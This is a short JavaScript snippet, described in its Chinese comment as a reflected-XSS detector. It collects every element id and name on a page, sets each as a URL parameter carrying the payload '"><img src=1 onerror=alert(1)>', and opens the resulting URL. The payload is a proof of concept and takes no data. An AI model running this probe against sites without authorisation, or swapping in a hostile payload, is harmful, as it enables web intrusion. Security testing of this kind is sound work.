/*
author:wutongyu
xss detection 主要用于探测页面name,id等内容是否存在输入->输出的一个url,检测是否存在反射型xss
*/
var dom = document.all;
var url_id = ""; //拼接url的id
var url_name = ""; //拼接url的name
var payload = '"><img src=1 onerror=alert(1)>'; //构造反射型xss的攻击向量
for(i=0;i <dom.length;i++)
{
	var dom_id = dom[i].id;
	if(typeof(dom_id)!="undefined"){
		if(dom_id!=""){	
			url_id += dom_id+'='+payload+'&';
		}
	}
    var dom_name = dom[i].name;
	if(typeof(dom_name)!="undefined"){
		if(dom_name!=""){
		    url_name += dom_name+'='+payload+'&';
		}
	}
}
window.open(location.href+"?"+url_id+url_name);